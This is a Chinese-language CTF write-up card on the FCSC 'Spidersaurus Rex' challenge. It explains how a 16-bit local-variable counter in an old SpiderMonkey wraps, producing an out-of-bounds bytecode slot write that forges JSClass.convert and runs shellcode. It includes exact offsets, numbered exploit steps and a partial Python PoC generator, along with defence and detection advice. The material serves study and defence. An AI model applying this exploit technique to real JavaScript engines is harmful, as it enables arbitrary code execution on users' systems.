---
id: binary-pwn-browser-nvars-uint16-wrap-bytecode-slot-oob-fake-class-convert
title: JS 引擎 nvars uint16 回绕：bytecode slot 越界写伪造 JSClass.convert 执行 shellcode
type: scenario
domain: binary
path: binary/pwn/browser
technique: js-engine-nvars-uint16-wrap-bytecode-slot-oob
aliases:
- Spidersaurus Rex
- SpiderMonkey nvars 回绕
- 65536 个局部变量
- bytecode slot 越界
- JSSLOT_CLASS
- JSClass convert
- JSVAL 奇数编码
tags:
- pwn
- browser
- javascript
- spidermonkey
- integer-truncation
- oob-write
- jsobject
- jsclass
- shellcode
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:53:10+08:00'
  notes: 已对照原文 Spidersaurus Rex 核对：JSFunction.nvars uint16、65536 局部变量回绕为 0、bytecode 仍带 16 位 slot、JSOP_SETVAR OOB、JSSLOT_CLASS=2、JSClass.convert 偏移 0x20、JSVAL 奇数编码与 shellcode chars+1、mprotect(-1) 使早期 heap RWX、vars=break+0xc825c0/slots=break+0xc845c0/slot 2050+2120/shellcode=break-0x153b0+1 均一致；原文有实测 flag，未本机复跑。
---

## 一句话结论

旧版 SpiderMonkey 的 `JSFunction.nvars` 是 `uint16`，函数声明 65536 个局部变量时计数回绕到 0；代码生成仍把每个变量声明时的 16 位 slot 写进 bytecode，运行时按 `nvars=0` 不分配局部变量 frame，于是 `JSOP_SETVAR` 的 `fp->vars[slot]` 变成越界写；攻击者用越界写改普通对象的 `JSSLOT_CLASS`，伪造 `JSClass.convert` 指向可执行堆中的 shellcode，调用该对象触发 `js_Invoke` 的 convert 路径执行代码。

## 原理

- 函数结构（旧 SpiderMonkey）：
  ```c
  struct JSFunction {
      ...
      uint16 nvars;   // 只有 16 位
      ...
  };
  ```
- parser 声明局部变量时逐个分配 slot：`sprop->id = INT_TO_JSVAL(fun->nvars++);`。变量名互不重复时，`v0..v65535` 依次拿到 slot `0..65535`；第 65536 次自增后 `fun->nvars` 回绕为 0，但 parse tree 与 bytecode 里的 slot 立即数已经固定。
- 代码生成对 `TOK_NAME` 直接发射 16 位 slot：`EMIT_ATOM_INDEX_OP(op, pn->pn_slot)`；解释器 `GET_VARNO(pc)` 读这两个字节。回绕不会抹掉 bytecode 里的 slot。
- 执行函数时 `js_Invoke` 把 `fun->nvars` 复制到 frame：`frame.nvars=0`，`if (nslots)` 为假，不分配局部变量空间；但 `JSOP_SETVAR` 仍信任 bytecode slot：
  ```c
  slot = (uintN)GET_VARNO(pc);
  vp = &fp->vars[slot];
  *vp = sp[-1];
  ```
  `PR_ASSERT(slot < fp->fun->nvars)` 在发布构建无效，于是 `v2048=...` 等赋值成为从 `fp->vars` 向后的 4 字节写。
- 对象结构：
  ```c
  struct JSObject { JSObjectMap *map; jsval *slots; };
  #define JSSLOT_CLASS 2
  ```
  创建对象时 `obj->slots[2] = PRIVATE_TO_JSVAL(clasp)`；`OBJ_GET_CLASS` 清最低位取 `JSClass *`。
- `JSClass.convert` 在结构偏移 0x20；`js_Invoke` 调用非函数对象时：
  ```c
  clasp = OBJ_GET_CLASS(cx, funobj);
  if (clasp != &js_FunctionClass)
      ok = clasp->convert(cx, funobj, JSTYPE_FUNCTION, &v);
  ```
  因此把对象 `g` 的 `slots[2]` 改成伪造 `JSClass`，把 `fake_class->convert` 填成 shellcode 入口，最后 `g()` 即跳转。
- JSVAL 编码：`INT_TO_JSVAL(i) = (i<<1)|1`，`JSVAL_TO_PRIVATE(v) = v & ~1`。越界写来自 JS 整数赋值，写入内存的 raw dword 必须是奇数；`JSSLOT_CLASS` 正好需要 `fake_class|1`。但 `convert` 是裸函数指针、调用时不清 tag，所以 shellcode 入口也必须是奇数地址——在 JS 字符串开头放一个填充字节，从 `chars+1` 执行。
- 可执行堆：题目补丁 `mprotect(JIT_buffer_page, -1, PROT_READ|WRITE|EXEC)`，`size_t -1` 使早期 heap 页变成 RWX；后续 brk 扩展的 heap 仍是 RW。把 shellcode 放在全局 JS 字符串 `var sc="..."` 中，`JSString.chars` 分配在早期可执行 heap，且全局引用使其存活到 `g()` 触发。
- 布局（TCP/stdin 模式）：`vars=break+0xc825c0`、`g.slots=break+0xc845c0`（差 0x2000）；`g.slots[2]` 对应 slot `(0x2000+8)/4=0x802=2050`；fake class 放在 `g.slots+0x100`，`convert` 对应 slot `(0x2000+0x100+0x20)/4=0x848=2120`。
- 泄漏：GC 打印 `sbrk(0)` 作为 break；补丁在 slot0 赋值时打印 `&fp->vars[0]`；在非函数 `js_Invoke` 时打印 `funobj->slots/clasp/convert`，用于确认偏移与跳转。

## 触发条件

- JS 引擎的函数局部变量计数使用 16 位（或更窄）类型，而 bytecode slot 操作数也是 16 位，且计数在声明阶段自增、在运行阶段用于 frame 分配。
- 代码生成没有在 `nvars` 回绕后拒绝或截断 slot；运行时没有校验 `slot < nvars`。
- 引擎允许对象 `JSSLOT_CLASS` 可写，且 `js_Invoke` 会对非函数对象调用 `clasp->convert`。
- 存在可执行/可写堆（JIT、RWX 映射、mprotect 缺陷）用于放 shellcode。
- 攻击者可向引擎提交大量源码并触发执行（如通过 TCP/stdin 输入 JS）。

## 利用步骤

1. 构造含 65536 个唯一局部变量的函数 `f`，让 `fun->nvars` 从 0xffff 回绕到 0；确认 bytecode 里仍有 `setvar 0x802/0x848` 等 slot。
2. 在 `f` 内部创建全局对象 `g={}`，使 `g.slots` 落在 `fp->vars` 后固定偏移（示例 0x2000）。
3. 在全局放一个 JS 字符串 `sc` 承载 shellcode；确认 `sc.chars` 位于早期可执行 heap，入口取 `chars+1`（奇数地址）。
4. 计算越界写 slot：`g.slots[2]` → `(0x2000+8)/4=0x802`；`fake_class->convert` → `(0x2000+0x100+0x20)/4=0x848`。
5. 在 `f` 中执行 `v2120=shell_entry; v2050=fake_class|1;`，用 JS 整数编码把 raw dword 写成奇数（`jsint_for_raw_word` 做反变换）。
6. `f()` 返回后全局 `g` 仍存活；调用 `g()`，`js_Invoke` 取 `g` 的 class 为伪造 class，调用 `convert` 跳到 shellcode。
7. shellcode 打开 `flag.txt` 并输出；通过 TCP 读回。

## PoC

```python
def jsint_for_raw_word(word):
    word &= 0xFFFFFFFF
    if (word & 1) == 0:
        raise ValueError("raw word must be odd")
    value = word >> 1
    if value >= 0x40000000:
        value -= 0x80000000
    return value

# vars=break+0xC825C0, slots=break+0xC845C0, sc.chars=break-0x153B0
writes = [
    (fake_class + 0x20, shell_entry),   # JSClass.convert
    (slots_addr + 2*4, fake_class | 1), # JSSLOT_CLASS
]
assignments = "".join(
    f"v{slot_for(vars_addr, target)}={jsint_for_raw_word(raw)};"
    for target, raw in writes
)
names = ",".join(f"v{i}" for i in range(65536))
src = f'var sc="{js_string_for_bytes(b"Z"+SHELLCODE)}";var g;' \
      f'function f(){{var {names};g={{}};{assignments}return 1;}}' \
      f'f();g();'
```

完整 EXP 见原文（含 JSVAL 编码、shellcode 字节串、break 泄漏解析、slot 计算）。PoC 未在本机执行；偏移依赖题目补丁与 TCP/stdin 布局。

## 变体与关联

- 变体：任何“计数窄于索引/操作数”的引擎都可能出现同类回绕（局部变量、参数、常量池、字节码寄存器）；关键是代码生成与运行时对计数的不一致。
- 变体：劫持点不限于 `JSClass.convert`；也可改 `JSObjectMap` 操作表、`JSFunction.call`、JIT 代码指针等。
- 变体：可执行堆来源可为 JIT、RWX 映射、`mprotect` 长度回绕；没有 RWX 时可用 ROP 改 mprotect。
- 关联卡片：[[binary-pwn-browser-v8-wasm-frame-state-type-confusion]]（V8 类型混淆）、[[ctf-pwn-bytecode-sandbox-header-memsize-stack-oob-rop]]（字节码沙箱栈越界）、[[binary-pwn-heap-abs-intmin-length-bypass-bss-fake-chunk-tcache-got]]（整数边界绕过）。
- 注意：本例为 Hackropole FCSC 2026 Spidersaurus Rex 题（旧 SpiderMonkey + 自定义 JIT 补丁）；真实浏览器引擎需具体版本与缓解措施。

## 检测与防御

- 防御：局部变量/参数计数使用 `size_t`/`uint32` 并做上限检查；代码生成前验证 `slot < nvars`；运行时不信任 bytecode slot，增加边界检查。
- 防御：frame 分配与 bytecode 生成使用同一计数快照，禁止在回绕后继续生成；对超大函数（>64K 局部变量）直接拒绝。
- 防御：W^X：禁止 RWX 堆/JIT 页，JIT 代码写入后 `mprotect` 为 RX；`mprotect` 长度参数做上界校验。
- 防御：对象 class 指针放在只读/受保护区域，或使用指针标记/CFI 校验 `convert` 目标。
- 检测：超大 JS 函数、65536 个局部变量、异常 `setvar` slot、JIT 页 RWX、`mprotect` 超大长度；引擎崩溃/类型混淆告警。
- 响应：限制不可信 JS 执行、升级引擎、启用沙箱与 W^X、审计 JIT 补丁。
